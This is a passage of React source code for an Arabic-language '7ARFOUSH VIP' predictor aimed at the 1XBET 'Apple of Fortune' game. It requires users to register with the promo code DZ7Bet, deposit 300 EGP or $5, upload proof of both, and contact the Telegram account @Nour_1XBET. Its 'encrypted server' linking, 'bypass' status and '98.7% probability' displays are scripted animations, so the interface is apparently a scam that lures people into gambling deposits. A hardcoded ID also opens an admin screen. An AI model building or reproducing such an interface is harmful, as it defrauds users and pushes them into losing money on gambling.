                  <p className="text-white/45 text-[10px] text-right font-sans leading-relaxed">
                    لتفعيل خادم رصد البيانات العادي وحصد إحداثيات ثغرة التفاحات البسيطة.
                  </p>
                </div>
              )}
            </div>
          </div>

          {/* PLAYER ACCOUNT TARGET ID COMPLIANCE ENTRY */}
          <div className="bg-black/55 border border-red-500/20 rounded-[24px] p-4.5 space-y-4 shadow-2xl backdrop-blur-sm relative overflow-hidden">
            <div className="flex items-center justify-between">
              <span className="text-[9px] font-mono text-red-500 font-extrabold uppercase">SYSTEM ID CONSOLE</span>
              <h3 className="text-xs font-black uppercase text-white/90 font-sans tracking-wide">الخطوة الخامسة والأخيرة: معرف اللاعب الخاص بك</h3>
            </div>

            <p className="text-white/50 text-[10px] select-none text-right leading-relaxed">
              أدخل رقم الآيدي (ID) للحساب الجديد الذي أنشأته بالبروموكود لتأكيد الربط:
            </p>

            <div className="relative group">
              <User className="absolute left-4 top-1/2 -translate-y-1/2 w-4 h-4 text-white/30 group-focus-within:text-red-400 transition-colors" />
              <input 
                type="text" 
                placeholder="أدخل معرف الآيدي المكون من الأرقام هنا..."
                value={userId}
                onChange={(e) => setUserId(e.target.value.replace(/\D/g, ''))}
                className="w-full bg-red-950/10 border border-red-500/20 focus:border-red-400 rounded-xl py-3.5 pl-11 pr-5 text-white placeholder:text-white/20 focus:outline-none transition-all font-mono text-center text-sm font-bold tracking-wider focus:ring-1 focus:ring-red-500/20 shadow-inner"
                id="account-id-input"
              />
            </div>

            {/* Dual Image Upload Section */}
            <div className="space-y-2">
              <p className="text-white/50 text-[10px] select-none text-right leading-relaxed">
                <span className="text-red-500 font-bold">*</span> يجب رفع صور إثبات التسجيل وإثبات الإيداع <span className="text-red-400 font-bold">(إجباري)</span> لتفعيل الـ VIP والربط بالسيرفر:
              </p>
              
              <div className="grid grid-cols-2 gap-3">
                {/* Deposit Image Upload Button */}
                <div className="relative">
                  <input 
                    type="file" 
                    id="deposit-screenshot-upload" 
                    accept="image/*" 
                    className="hidden" 
                    onChange={(e) => handleFileUpload('deposit', e)}
                  />
                  <label 
                    htmlFor="deposit-screenshot-upload"
                    className={cn(
                      "flex flex-col items-center justify-center p-3 rounded-xl border border-dashed transition-all duration-300 cursor-pointer min-h-[110px] relative overflow-hidden text-center",
                      uploadedImages.deposit 
                        ? "border-green-500/50 bg-green-500/5" 
                        : "border-red-500/20 bg-red-950/10 hover:border-red-500/45 hover:bg-red-500/5"
                    )}
                  >
                    {uploadedImages.deposit ? (
                      <>
                        <img 
                          src={uploadedImages.deposit} 
                          alt="Deposit Screenshot" 
                          className="absolute inset-0 w-full h-full object-cover rounded-xl"
                        />
                        <div className="absolute inset-0 bg-black/60 flex items-center justify-center opacity-0 hover:opacity-100 transition-opacity">
                          <span className="text-[9px] text-white font-bold uppercase tracking-wider bg-red-600/80 px-2 py-1 rounded">تغيير الصورة</span>
                        </div>
                        <div className="absolute top-1.5 right-1.5 bg-green-500 text-white rounded-full p-0.5 shadow-md">
                          <Check className="w-3 h-3 stroke-[3]" />
                        </div>
                      </>
                    ) : (
                      <div className="flex flex-col items-center gap-1.5">
                        <div className="p-1.5 bg-red-500/10 border border-red-500/20 rounded-lg text-red-400">
                          <Upload className="w-4 h-4" />
                        </div>
                        <span className="text-[10px] font-black text-white font-sans leading-none">صورة الإيداع <span className="text-red-500 font-bold">*</span></span>
                        <span className="text-[8px] text-white/30 font-sans tracking-wide">300 جنيه أو 5$</span>
                      </div>
                    )}
                  </label>
                </div>

                {/* Promo Code Registration Upload Button */}
                <div className="relative">
                  <input 
                    type="file" 
                    id="promo-screenshot-upload" 
                    accept="image/*" 
                    className="hidden" 
                    onChange={(e) => handleFileUpload('promo', e)}
                  />
                  <label 
                    htmlFor="promo-screenshot-upload"
                    className={cn(
                      "flex flex-col items-center justify-center p-3 rounded-xl border border-dashed transition-all duration-300 cursor-pointer min-h-[110px] relative overflow-hidden text-center",
                      uploadedImages.promo 
                        ? "border-green-500/50 bg-green-500/5" 
                        : "border-red-500/20 bg-red-950/10 hover:border-red-500/45 hover:bg-red-500/5"
                    )}
                  >
                    {uploadedImages.promo ? (
                      <>
                        <img 
                          src={uploadedImages.promo} 
                          alt="Promo registration screenshot" 
                          className="absolute inset-0 w-full h-full object-cover rounded-xl"
                        />
                        <div className="absolute inset-0 bg-black/60 flex items-center justify-center opacity-0 hover:opacity-100 transition-opacity">
                          <span className="text-[9px] text-white font-bold uppercase tracking-wider bg-red-600/80 px-2 py-1 rounded">تغيير الصورة</span>
                        </div>
                        <div className="absolute top-1.5 right-1.5 bg-green-500 text-white rounded-full p-0.5 shadow-md">
                          <Check className="w-3 h-3 stroke-[3]" />
                        </div>
                      </>
                    ) : (
                      <div className="flex flex-col items-center gap-1.5">
                        <div className="p-1.5 bg-red-500/10 border border-red-500/20 rounded-lg text-red-400">
                          <Upload className="w-4 h-4" />
                        </div>
                        <span className="text-[10px] font-black text-white font-sans leading-none">صورة التسجيل <span className="text-red-500 font-bold">*</span></span>
                        <span className="text-[8px] text-white/30 font-sans tracking-wide">بالبروموكود DZ7Bet</span>
                      </div>
                    )}
                  </label>
                </div>
              </div>
            </div>

            {userId === "000111000" && (
              <motion.div 
                initial={{ opacity: 0, y: -5 }}
                animate={{ opacity: 1, y: 0 }}
                className="p-3.5 bg-red-500/10 border border-red-500/30 rounded-xl text-center text-xs text-red-400 font-black"
              >
                مرحباً بك في نظام الإدارة المشفرة 🛡️
                <br />
                اضغط على الزر أدناه للانتقال للوحة التحكم مباشرة.
              </motion.div>
            )}

            {/* Red Action confirmation submit key */}
            <motion.button 
              whileHover={(userId && (userId === "000111000" || (uploadedImages.deposit && uploadedImages.promo))) ? { scale: 1.015, boxShadow: "0 8px 25px rgba(239,68,68,0.3)" } : {}}
              whileTap={(userId && (userId === "000111000" || (uploadedImages.deposit && uploadedImages.promo))) ? { scale: 0.985 } : {}}
              onClick={() => {
                if (!userId) {
                  triggerToast("يرجى إدخال معرف اللاعب (ID) أولاً", "warning");
                  return;
                }
                if (userId === "000111000") {
                  setCurrentScreen('ADMIN');
                  return;
                }
                if (!uploadedImages.deposit) {
                  triggerToast("يرجى رفع صورة إثبات الإيداع (إجباري)", "warning");
                  return;
                }
                if (!uploadedImages.promo) {
                  triggerToast("يرجى رفع صورة إثبات التسجيل بالبروموكود (إجباري)", "warning");
                  return;
                }
                handleVerification();
              }}
              className={cn(
                "w-full py-3.5 rounded-xl font-black text-xs tracking-[0.2em] font-display uppercase transition-all mt-2 shadow-2xl cursor-pointer relative overflow-hidden",
                (userId && (userId === "000111000" || (uploadedImages.deposit && uploadedImages.promo))) 
                  ? "bg-gradient-to-r from-red-650 to-red-500 text-white hover:from-red-500 hover:to-red-400 font-black scale-[1.01]" 
                  : "bg-white/5 text-white/35 border border-white/5 hover:border-red-500/25 transition-all"
              )}
              id="final-verification-submit"
            >
              <span className="relative z-10 flex items-center justify-center gap-1.5">
                <ShieldCheck className="w-4.5 h-4.5 text-white" />
                تأكيد ومزامنة الآيدي بالسيرفر المشفر
              </span>
            </motion.button>
          </div>

        </div>
      </div>

      {/* Floating Status Notification Toast */}
      <AnimatePresence>
        {showConnectionModal && (
          <div className="fixed top-8 left-1/2 -translate-x-1/2 z-[60] w-[92%] max-w-xs pointer-events-none">
            <motion.div 
              initial={{ y: -25, opacity: 0 }}
              animate={{ y: 0, opacity: 1 }}
              exit={{ y: -25, opacity: 0 }}
              className="bg-[#0c0c0c] border border-red-500/30 p-4 rounded-xl flex items-center gap-3.5 backdrop-blur-xl shadow-[0_10px_35px_rgba(0,0,0,0.8)] pr-6 text-right"
              id="platform-link-toast"
              style={{ direction: 'rtl' }}
            >
              <div className="w-8 h-8 rounded-full bg-red-500/10 border border-red-500/30 flex items-center justify-center text-red-400 animate-bounce flex-shrink-0">
                <Crown className="w-4 h-4" />
              </div>
              <div className="text-right">
                <h3 className="text-white font-black uppercase text-[10px] tracking-wider leading-none">تأكيد خادم الربط</h3>
                <p className="text-red-400/80 text-[8.5px] uppercase tracking-wider font-mono mt-1 font-bold">المنصة: {selectedPlatform}</p>
              </div>
            </motion.div>
          </div>
        )}

        {isVerifying && (
          <div className="fixed inset-0 z-[100] flex flex-col items-center justify-center p-6 bg-black/98 backdrop-blur-2xl" id="verification-overlay-container">
            {/* Animated Logo at the top of the dialog */}
            <motion.div
              animate={{ y: [-8, 8, -8] }}
              transition={{ duration: 4, repeat: Infinity, ease: "easeInOut" }}
              className="mb-8 relative"
            >
              <div className="absolute inset-0 bg-red-500/10 blur-2xl animate-pulse" />
              <ElegantLogo size="lg" className="scale-105" />
            </motion.div>

            {/* Premium Dialog Panel */}
            <div className="w-full max-w-sm bg-gradient-to-b from-[#140204] to-black border border-red-500/30 p-6 sm:p-8 rounded-[36px] text-center shadow-[0_0_60px_rgba(239,68,68,0.15)] relative overflow-hidden shadow-inner" id="connection-steps-modal">
              {/* Red light sweep */}
              <div className="absolute top-0 inset-x-0 h-[1.5px] bg-gradient-to-r from-transparent via-red-500 to-transparent" />
              
              <div className="mb-6 text-center">
                <span className="text-[10px] text-red-100 tracking-[0.25em] font-mono block mb-1 font-black">SECURE PORT CONNECTION</span>
                <h3 className="text-sm font-black text-white/95 font-sans">بوابة التوجيه والربط بالسيرفر المشفر</h3>
              </div>

              {/* Progress Steps List */}
              <div className="space-y-4 text-right mb-6" style={{ direction: 'rtl' }}>
                {[
                  "يتم الآن ربط حسابك بالسيرفر المشفر",
                  "جاري مزامنة قواعد البيانات وتأمين السيبرانية",
                  "تم التحقق وتنشيط باقة Harfoush الذهبية",
                  "جاري تسجيل دخولك الآمن للخادم"
                ].map((stepText, idx) => {
                  const isCompleted = idx < verificationStep;
                  const isActive = idx === verificationStep;

                  return (
                    <div 
                      key={idx}
                      className={cn(
                        "flex items-center gap-3.5 p-3 rounded-2xl border transition-all duration-300",
                        isActive 
                          ? "bg-red-500/10 border-red-500/40 shadow-[0_4px_12px_rgba(239,68,68,0.15)] scale-[1.01]" 
                          : isCompleted 
                            ? "bg-emerald-500/5 border-emerald-500/25 opacity-100" 
                            : "bg-white/[0.01] border-white/5 opacity-30"
                      )}
                    >
                      {/* State Indicator Icon/Circle */}
                      <div className="flex-shrink-0">
                        {isCompleted ? (
                          <div className="w-5.5 h-5.5 rounded-full bg-emerald-500/20 border border-emerald-500 flex items-center justify-center text-emerald-400 font-sans">
                            <Check className="w-3 h-3 stroke-[3]" />
                          </div>
                        ) : isActive ? (
                          <div className="w-5.5 h-5.5 rounded-full bg-red-500/20 border border-red-500 flex items-center justify-center font-sans">
                            <span className="w-2 h-2 rounded-full bg-red-400 animate-ping" />
                          </div>
                        ) : (
                          <div className="w-5.5 h-5.5 rounded-full bg-white/5 border border-white/10 flex items-center justify-center text-white/20 font-mono text-[9px] font-bold">
                            0{idx + 1}
                          </div>
                        )}
                      </div>

                      {/* Step Text content */}
                      <div className="flex-grow">
                        <span className={cn(
                          "text-xs font-black font-sans tracking-wide block",
                          isActive 
                            ? "text-red-400" 
                            : isCompleted 
                              ? "text-emerald-400" 
                              : "text-white/45"
                        )}>
                          {stepText}
                        </span>
                      </div>
                    </div>
                  );
                })}
              </div>

              {/* Loader percentage/progress bar at the bottom */}
              <div className="space-y-2">
                <div className="flex justify-between items-center px-1 font-mono text-[9px] select-none">
                  <span className="text-red-400 font-black tracking-wider">GATEWAY CONNECTING</span>
                  <span className="text-white/50">{Math.min(100, Math.floor((verificationStep) * 25 + 12.5))}%</span>
                </div>
                <div className="w-full bg-white/5 h-1.5 rounded-full overflow-hidden p-[1px]">
                  <motion.div 
                    initial={{ width: "10%" }}
                    animate={{ width: `${(verificationStep + 1) * 25}%` }}
                    transition={{ duration: 3, ease: "linear" }}
                    className="h-full bg-gradient-to-r from-red-600 to-red-400 rounded-full shadow-[0_0_8px_rgba(239,68,68,0.5)]"
                  />
                </div>
              </div>
            </div>
          </div>
        )}

        {showKeyDialog && (
          <div className="fixed inset-0 z-[105] flex flex-col items-center justify-center p-6 bg-black/95 backdrop-blur-2xl animate-fade-in" id="key-dialog-overlay">
            {/* Animated Logo at the top of the dialog */}
            <motion.div
              animate={{ y: [-5, 5, -5] }}
              transition={{ duration: 4, repeat: Infinity, ease: "easeInOut" }}
              className="mb-6 relative"
            >
              <div className="absolute inset-0 bg-red-500/15 blur-2xl animate-pulse" />
              <ElegantLogo size="md" className="scale-105" />
            </motion.div>

            {/* Premium Dialog Panel */}
            <div className="w-full max-w-sm bg-gradient-to-b from-[#180305] to-black border border-red-500/35 p-6 sm:p-8 rounded-[36px] text-center shadow-[0_0_60px_rgba(239,68,68,0.25)] relative overflow-hidden" id="key-generated-modal">
              {/* Top red sweep */}
              <div className="absolute top-0 inset-x-0 h-[1.5px] bg-gradient-to-r from-transparent via-red-500 to-transparent" />
              
              <div className="mb-6 text-center">
                <span className="text-[10px] text-red-400 tracking-[0.25em] font-mono block mb-1 font-bold">SUBMITTED SUCCESSFULLY</span>
                <h3 className="text-base font-black text-white/95 font-sans">تم إرسال مستندات التفعيل بنجاح!</h3>
              </div>

              {/* Telegram support username container */}
              <div className="relative p-4 bg-black/80 border border-red-500/30 rounded-2xl flex flex-col items-center justify-center gap-1.5 overflow-hidden shadow-inner mb-6">
                <span className="text-[9px] text-white/40 uppercase tracking-widest font-mono">SUPPORT CONTACT</span>
                <span className="font-mono text-base sm:text-lg font-black tracking-wider text-red-400">
                  @Nour_1XBET
                </span>
              </div>

              {/* Auto redirection banner */}
              <div className="w-full py-4 bg-red-950/20 border border-red-500/30 rounded-xl flex flex-col items-center justify-center gap-2 shadow-inner mb-4">
                <div className="flex items-center gap-2">
                  <span className="w-2 h-2 rounded-full bg-red-500 animate-ping" />
                  <span className="text-xs text-red-400 font-black font-sans tracking-wide">
                    جاري توجيهك إلى التليجرام تلقائياً...
                  </span>
                </div>
                <span className="text-[9.5px] text-white/50">خلال 3 ثوانٍ للتنشيط الفوري للاشتراك</span>
              </div>

              {/* Manual navigation button */}
              <a 
                href="https://t.me/Nour_1XBET"
                target="_blank"
                rel="noopener noreferrer"
                className="w-full py-3 px-4 bg-gradient-to-r from-red-650 to-red-500 text-white hover:from-red-500 hover:to-red-400 rounded-xl font-black text-xs tracking-wider transition-all cursor-pointer flex items-center justify-center gap-2 shadow-[0_4px_15px_rgba(239,68,68,0.25)]"
              >
                <Send className="w-4 h-4 text-white" />
                <span>انتقل يدويًا للتليجرام</span>
              </a>
            </div>
          </div>
        )}
      </AnimatePresence>
    </div>
  );

  // 3. REDESIGNED LICENSE ACTIVIOUS SUCCESS SCREEN (Digital Holo ID card)
  const renderLicense = () => (
    <div className="min-h-screen p-6 flex flex-col items-center justify-center max-w-md mx-auto text-center relative overflow-x-hidden bg-transparent font-sans">
      <div className="relative z-10 flex flex-col items-center w-full max-w-sm">
        
        {/* Check Indicator badge circles */}
        <div className="w-18 h-18 bg-red-500/10 border border-red-500/35 rounded-full flex items-center justify-center mb-6 relative shadow-[0_0_30px_rgba(239,68,68,0.3)]">
          <Check className="w-9 h-9 text-red-500" strokeWidth={4} />
          <div className="absolute inset-0 rounded-full bg-red-500/10 animate-ping" />
        </div>
        
        <h2 className="text-2xl font-black text-white font-display uppercase tracking-widest mb-1.5">ACTIVATION SUCCESS</h2>
        <p className="text-white/50 text-xs mb-8 tracking-wider">Your secure license key is compiled</p>

        {/* Purple Holographic Digital Box */}
        <div className="w-full bg-black/80 border border-red-500/40 p-6 rounded-[28px] mb-8 relative overflow-hidden group shadow-2xl">
          <div className="absolute inset-x-0 bottom-0 h-[2.5px] bg-gradient-to-r from-transparent via-red-500/50 to-transparent animate-pulse" />
          <div className="flex items-center justify-between gap-3">
            <span className="font-mono text-sm sm:text-base font-black tracking-widest text-red-400 truncate">{licenseKey}</span>
            <button 
              onClick={() => {
                navigator.clipboard.writeText(licenseKey);
                setShowCopyToast(true);
                setTimeout(() => setShowCopyToast(false), 2000);
              }}
              className="p-3 bg-white/5 border border-white/10 rounded-xl hover:bg-red-500/10 hover:text-white transition-all shadow-md cursor-pointer flex items-center justify-center h-10 w-10"
              id="copy-license-button"
            >
              <Copy className="w-4 h-4 text-red-400" />
            </button>
          </div>
          
          <AnimatePresence>
            {showCopyToast && (
              <motion.div 
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
                exit={{ opacity: 0 }}
                className="absolute inset-0 bg-red-500 text-white flex items-center justify-center font-display uppercase font-mono font-black text-xs tracking-widest"
              >
                License Key Copied!
              </motion.div>
            )}
          </AnimatePresence>
        </div>

        {/* Realtime Chronigraph Clock panel */}
        <div className="bg-white/[0.02] border border-white/5 px-6 py-5 rounded-[28px] w-full mb-8 flex items-center justify-between shadow-inner">
          <div className="text-left space-y-1">
            <span className="text-[10px] text-white/40 uppercase tracking-widest font-mono">TOKEN VALIDITY</span>
            <h4 className="text-emerald-400 font-extrabold text-[11px] uppercase tracking-wide">30 MINUTES GRANTED</h4>
          </div>
          <div className="h-10 w-[1px] bg-white/10" />
          <div className="flex items-center gap-2.5">
            <Clock className="w-5 h-5 text-red-400 animate-pulse" />
            <span className="text-xl font-mono font-black text-white">30:00</span>
          </div>
        </div>

        {/* Return login action */}
        <motion.button 
          whileHover={{ scale: 1.02 }}
          whileTap={{ scale: 0.98 }}
          onClick={() => {
            setPassword(licenseKey);
            setCurrentScreen('CONDITION');
          }}
          className="w-full py-4.5 bg-transparent border border-red-500/60 text-red-100 hover:bg-red-500 hover:text-white shadow-[0_10px_25px_rgba(239,68,68,0.15)] rounded-2xl font-black font-display uppercase tracking-widest text-xs transition-colors cursor-pointer animate-pulse"
          id="proceed-to-login"
        >
          PROCEED INTERRUPT LOGIN
        </motion.button>
      </div>
    </div>
  );

  // 4. THE COCKPIT INSTRUMENT PREDICTION PANEL REDESIGNED (Gorgeous Neomorphic Cyber Grid)
  const renderPrediction = () => {
    const isEgyptServer = selectedServerName?.includes('مصري') || selectedServerName?.includes('EG') || selectedServerName?.includes('سيرفر مصري');
    const serverDisplay = isEgyptServer ? "EGYPT" : "OTHER";
    
    return (
      <div className="min-h-screen flex flex-col bg-transparent overflow-x-hidden max-w-lg mx-auto border-x border-white/5 relative justify-between pb-8 select-none">
        
        {/* Full screen cyber guide lines & telemetry */}
        <div className="absolute inset-0 border border-red-500/5 pointer-events-none z-0">
          <div className="absolute top-10 left-4 text-[7px] font-mono text-red-500/20 tracking-wider">SEC_LINK_CONNECTED</div>
          <div className="absolute top-10 right-4 text-[7px] font-mono text-red-500/20 tracking-wider">LATENCY: 12ms</div>
          <div className="absolute bottom-16 left-4 text-[7px] font-mono text-red-500/20 tracking-wider">BYPASS_READY: true</div>
          <div className="absolute bottom-16 right-4 text-[7px] font-mono text-red-500/20 tracking-wider">ALGORITHM_v4.8</div>
          {/* Vertical and horizontal cyber guidelines */}
          <div className="absolute inset-x-0 top-1/4 border-t border-red-500/[0.02]" />
          <div className="absolute inset-x-0 top-2/3 border-t border-red-500/[0.02]" />
          <div className="absolute left-1/4 inset-y-0 border-l border-red-500/[0.02]" />
          <div className="absolute right-1/4 inset-y-0 border-l border-red-500/[0.02]" />
        </div>

        {/* Decorative neon glow spotlights */}
        <div className="absolute top-1/6 left-1/2 -translate-x-1/2 w-80 h-80 bg-red-600/10 rounded-full blur-[100px] pointer-events-none z-0" />
        <div className="absolute bottom-1/4 left-10 w-72 h-72 bg-red-600/5 rounded-full blur-[110px] pointer-events-none z-0 animate-pulse-slow" />

        {/* Maintenance lock dialog screen overlay */}
        <AnimatePresence>
          {isMaintenanceActive && (
            <motion.div 
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              className="fixed inset-0 z-[100] flex items-center justify-center p-6 bg-black/95 backdrop-blur-md"
              id="maintenance-overlay"
            >
              <div className="w-full max-w-xs bg-gradient-to-b from-[#140204]/95 to-[#000]/98 p-8 rounded-[36px] border border-red-500/40 text-center space-y-5 shadow-[0_0_60px_rgba(239,68,68,0.3)] relative">
                <div className="w-14 h-14 bg-red-500/15 rounded-2xl border border-red-500/30 flex items-center justify-center mx-auto text-red-400 animate-bounce">
                  <Info className="w-7 h-7" />
                </div>
                <div className="space-y-1.5">
                  <h3 className="text-lg font-black text-white uppercase tracking-wider font-display">System Upgrading</h3>
                  <p className="text-[11px] text-white/50 tracking-wider leading-relaxed">
                    The 7ARFOUSH VIP predictive engine is undergoing structural maintenance. Expect enhanced odds vectors momentarily.
                  </p>
                </div>
              </div>
            </motion.div>
          )}
        </AnimatePresence>

        {/* Main Panel Content */}
        <div className="flex-grow flex flex-col relative z-10 px-5 pt-4 space-y-5">
          
          {/* Dynamic Top Bar Header redesigned as futuristic HUD capsule */}
          <div className="flex items-center justify-between bg-black/60 border border-red-500/20 rounded-[22px] px-4 py-3.5 shadow-[0_4px_20px_rgba(239,68,68,0.06)] backdrop-blur-xl relative overflow-hidden group">
            {/* Top scanning accent glow */}
            <div className="absolute top-0 inset-x-0 h-[1.5px] bg-gradient-to-r from-transparent via-red-500 to-transparent opacity-80" />
            
            {/* Server Display (Left side) */}
            <div className="flex items-center gap-2">
              <div className="w-2 h-2 rounded-full bg-emerald-500 animate-ping shrink-0" />
              <div className="flex flex-col">
                <span className="text-[7.5px] font-black text-white/45 tracking-widest font-mono leading-none">SYS SERVER</span>
                <span className={cn(
                  "text-[10px] font-black font-mono tracking-wider mt-0.5",
                  isEgyptServer ? "text-emerald-400" : "text-red-400"
                )}>
                  {serverDisplay} CONNECTED
                </span>
              </div>
            </div>

            {/* Platform Selection (Right side) */}
            <div className="flex items-center gap-2 text-right">
              <div className="flex flex-col items-end">
                <span className="text-[7.5px] font-black text-white/45 tracking-widest font-mono leading-none">VIP BYPASS</span>
                <span className="text-[10px] font-black font-mono text-red-400 tracking-wider mt-0.5">
                  {selectedPlatform || '1XBET'} GATEWAY
                </span>
              </div>
              <div className="w-6 h-6 rounded-lg bg-red-500/10 border border-red-500/30 flex items-center justify-center shrink-0">
                <ShieldCheck className="w-3.5 h-3.5 text-red-400" />
              </div>
            </div>
          </div>

          {/* Premium Animated Decryption Header Bar */}
          <div className="bg-gradient-to-r from-red-950/10 via-red-950/30 to-red-950/10 border-y border-red-500/10 py-2.5 px-4 flex items-center justify-between text-[9px] font-mono tracking-widest text-red-300">
            <div className="flex items-center gap-1.5">
              <span className="inline-block w-1.5 h-1.5 bg-red-400 rounded-full animate-pulse" />
              <span>7ARFOUSH_ENGINE: ACTIVE</span>
            </div>
            <div className="flex items-center gap-4">
              <span className="animate-pulse">PROBABILITY: 98.7%</span>
              <span className="text-white/35 font-bold">V4.8 VIP</span>
            </div>
          </div>

          {/* Platform logo Container using exact Splash screen branding logo */}
          <div className="flex flex-col items-center justify-center pt-1.5 pb-0.5 relative">
            <div className="relative">
              <ElegantLogo size="md" className="scale-90 drop-shadow-[0_8px_30px_rgba(239,68,68,0.3)]" />
              {/* Animated orbital rings */}
              <div className="absolute inset-0 border border-red-500/10 rounded-full scale-[1.3] -z-10 animate-spin-slow pointer-events-none" />
              <div className="absolute inset-0 border border-red-500/5 rounded-full scale-[1.65] -z-10 animate-reverse-spin-slow pointer-events-none" />
            </div>
            <span className="text-[8px] font-mono text-red-400/50 uppercase tracking-[0.35em] mt-3 font-bold">7ARFOUSH SYSTEM COGNITIVE ENGINE</span>
          </div>

          {/* Three side-by-side countdown circles */}
          <div className="flex justify-center items-center gap-6 py-2.5 bg-black/40 border border-red-500/10 rounded-[28px] p-4 shadow-inner relative z-10 w-full max-w-sm mx-auto">
            {/* Hours Circle */}
            <div className="flex flex-col items-center">
              <div className="relative w-14 h-14 rounded-full border border-red-500/20 bg-red-950/10 flex items-center justify-center shadow-[0_0_12px_rgba(239,68,68,0.08)] overflow-hidden">
                {/* Animated ticking outer ring */}
                <motion.div 
                  animate={{ rotate: 360 }}
                  transition={{ duration: 12, repeat: Infinity, ease: "linear" }}
                  className="absolute inset-0.5 rounded-full border-t border-red-500/50 border-r-transparent border-b-transparent border-l-transparent"
                />
                <motion.span 
                  key={h}
                  initial={{ scale: 0.85, opacity: 0.7 }}
                  animate={{ scale: 1, opacity: 1 }}
                  className="text-base font-mono font-black text-white drop-shadow-[0_0_8px_rgba(239,68,68,0.5)] z-10"
                >
                  {h}
                </motion.span>
              </div>
              <span className="text-[8px] text-red-400 font-bold uppercase tracking-wider mt-1.5 font-mono">Hours</span>
            </div>

            {/* Minutes Circle */}
            <div className="flex flex-col items-center">
              <div className="relative w-14 h-14 rounded-full border border-red-500/20 bg-red-950/10 flex items-center justify-center shadow-[0_0_12px_rgba(239,68,68,0.08)] overflow-hidden">
                {/* Animated ticking outer ring */}
                <motion.div 
                  animate={{ rotate: -360 }}
                  transition={{ duration: 10, repeat: Infinity, ease: "linear" }}
                  className="absolute inset-0.5 rounded-full border-b border-red-500/50 border-t-transparent border-r-transparent border-l-transparent"
                />
                <motion.span 
                  key={m}
                  initial={{ scale: 0.85, opacity: 0.7 }}
                  animate={{ scale: 1, opacity: 1 }}
                  className="text-base font-mono font-black text-white drop-shadow-[0_0_8px_rgba(239,68,68,0.5)] z-10"
                >
                  {m}
                </motion.span>
              </div>
              <span className="text-[8px] text-red-400 font-bold uppercase tracking-wider mt-1.5 font-mono">Minutes</span>
            </div>

            {/* Seconds Circle */}
            <div className="flex flex-col items-center">
              <div className="relative w-14 h-14 rounded-full border border-red-500/20 bg-red-950/10 flex items-center justify-center shadow-[0_0_12px_rgba(239,68,68,0.08)] overflow-hidden">
                {/* Animated ticking outer pulse */}
                <motion.div 
                  animate={{ scale: [1, 1.06, 1] }}
                  transition={{ duration: 1, repeat: Infinity, ease: "easeInOut" }}
                  className="absolute inset-0 rounded-full border border-red-500/30"
                />
                <motion.div 
                  animate={{ rotate: 360 }}
                  transition={{ duration: 1, repeat: Infinity, ease: "linear" }}
                  className="absolute inset-0.5 rounded-full border-l border-red-500/50 border-t-transparent border-r-transparent border-b-transparent"
                />
                <motion.span 
                  key={s}
                  initial={{ scale: 0.85, opacity: 0.7 }}
                  animate={{ scale: 1, opacity: 1 }}
                  className="text-base font-mono font-black text-white drop-shadow-[0_0_8px_rgba(239,68,68,0.5)] z-10"
                >
                  {s}
                </motion.span>
              </div>
              <span className="text-[8px] text-red-400 font-bold uppercase tracking-wider mt-1.5 font-mono">Seconds</span>
            </div>
          </div>

          {/* Outer Grid Wrapper to prevent Floating ID Badge overflow cut-off */}
          <div className="relative pt-10 flex flex-col gap-4">
            {/* Absolute Floating user ID Badge on top-right edge (Now decoupled from overflow-hidden frame) */}
            <div className="absolute right-5 top-0 z-30 px-4 py-1.5 bg-[#140204]/95 border border-red-500/70 rounded-full shadow-[0_0_20px_rgba(239,68,68,0.4)] flex items-center gap-2 select-none">
              <div className="w-1.5 h-1.5 rounded-full bg-red-400 animate-ping" />
              <span className="text-[10px] font-mono font-black text-white/95 tracking-widest whitespace-nowrap">ID: {userId || '778899_PRO'}</span>
            </div>

            {/* Futuristic Level / Odds Selector */}
            <div className="flex flex-col gap-2.5 bg-black/55 border border-red-500/15 rounded-[22px] p-3.5 shadow-lg select-none relative z-20">
              <div className="flex justify-between items-center px-1">
                <span className="text-[10px] text-white/50 font-sans font-bold text-right">اختر الصف الحالي (مضاعف الربح)</span>
                <span className="text-[10px] font-mono font-black text-red-400 bg-red-500/10 px-2 py-0.5 rounded border border-red-500/15">
                  الصف {selectedLevelIdx + 1} - {PREDEFINED_ODDS[selectedLevelIdx].toFixed(2)}x
                </span>
              </div>
              
              {/* Horizontal scrollable step buttons */}
              <div className="flex gap-1.5 overflow-x-auto pb-1 scrollbar-none justify-start">
                {PREDEFINED_ODDS.map((odd, idx) => {
                  const isActive = selectedLevelIdx === idx;
                  return (
                    <button
                      key={idx}
                      type="button"
                      onClick={() => {
                        setSelectedLevelIdx(idx);
                      }}
                      className={cn(
                        "shrink-0 min-w-[54px] py-1.5 px-1 rounded-xl border text-center transition-all duration-300 cursor-pointer",
                        isActive 
                          ? "bg-red-500/20 border-red-500 text-white font-extrabold shadow-[0_0_12px_rgba(239,68,68,0.3)]" 
                          : "bg-red-950/10 border-red-500/10 hover:border-red-500/30 text-white/60 hover:text-white"
                      )}
                    >
                      <div className="text-[8px] opacity-45 uppercase font-mono tracking-wider">صف {idx + 1}</div>
                      <div className="text-[10px] font-black font-mono mt-0.5">{odd.toFixed(2)}</div>
                    </button>
                  );
                })}
              </div>
            </div>

            {/* 10-Levels Apple of Fortune Grid Container with Floating ID Badge */}
            <div className="relative bg-black/45 border border-red-500/20 rounded-[32px] p-4.5 pt-8.5 shadow-[0_15px_40px_rgba(0,0,0,0.6)] backdrop-blur-md overflow-hidden">
              {/* Corner Bracket Decorators */}
              <div className="absolute top-4 left-4 w-4 h-4 border-t-2 border-l-2 border-red-500/40 rounded-tl" />
              <div className="absolute top-4 right-4 w-4 h-4 border-t-2 border-r-2 border-red-500/40 rounded-tr" />
              <div className="absolute bottom-4 left-4 w-4 h-4 border-b-2 border-l-2 border-red-500/40 rounded-bl" />
              <div className="absolute bottom-4 right-4 w-4 h-4 border-b-2 border-r-2 border-red-500/40 rounded-br" />

              {/* Glowing vertical columns divider rails */}
              <div className="absolute top-0 bottom-0 left-[76.5px] w-[1px] bg-gradient-to-b from-transparent via-red-500/15 to-transparent pointer-events-none" />

            {/* Laser sweeps background on prediction loading */}
            {isPredicting && (
              <motion.div 
                initial={{ y: -80, opacity: 0 }}
                animate={{ y: [420, -50], opacity: [0.6, 0.6] }}
                transition={{ repeat: Infinity, duration: 1.5, ease: "linear" }}
                className="absolute inset-x-0 h-10 bg-gradient-to-b from-transparent via-red-500/30 to-transparent pointer-events-none z-20"
              />
            )}

            {/* Inner Grid frame - Cyber Rail System */}
            <div className="flex flex-col gap-2 relative z-10 select-none" id="prediction-grid-wrapper">
              
